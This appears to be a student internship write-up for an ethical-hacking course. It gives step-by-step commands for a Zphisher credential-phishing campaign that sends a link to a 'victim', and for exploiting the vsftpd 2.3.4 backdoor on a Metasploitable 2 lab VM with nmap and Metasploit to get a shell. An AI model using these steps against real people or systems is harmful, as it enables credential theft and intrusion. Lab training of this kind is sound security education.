# Week-4-AdvancedTopicsandEthicalHacking-
Sapience Edu Connect Pvt Ltd -Internship task-4

## 1.PerformPhishingusingZphisher.(Finditinyourownway!). 
 
 
## Step1: Install   Zphisher using this command 
 
 git clone https://github.com/htr-tech/zphisher.git 
 
## step2: 
           cd Zphisher 
## step3: 
           bash zphisher.sh       
  
## Step4: Enter number of  platform you want 
 
## Step5: select option 1 
          
## Step6: select option 2 
 
Select :N 
          
## Step7: copy the url and send to victim 
 
 
## step8: after the victim entering their details we will get the details 

Here we got the login credentials!!
  
# 2.Machinetohack(usemetasploitable2machineasavictim)    
     ●Find  and  exploit the vsftpd vulnerability by using nmap and     
the Metasploi tframework. 
 ● Target and exploit the machine throughout  the persistence   
phase. 
 
## Step 1: Identify the Target 
First, ensure you have the IP address of the Metasploitable 2 machine 
Using command ifconfig 
 
## Step 2: Scan the Target with Nmap 
Use Nmap to scan the target machine and identify open ports and 
services. 
 
Nmap -sV 172.20.10.3 

Here number of ports are open  
 
Now we are exploiting port 21/tcp ftp(services) vsftpd 
 
## Step 3: Exploit the vsftpd Vulnerability with Metasploit 
 
 
## Commands: 

### msfconsole  
 
### search vsftpd 

 
### use exploit/unix/ftp/vsftpd_234_backdoor 

 
### Show options 

### set RHOST 172.20.10.3 
 
### exploit 
 
we successfully  got a shell on the target machine and  we successfully  
exploit the 
metasploitable2.  
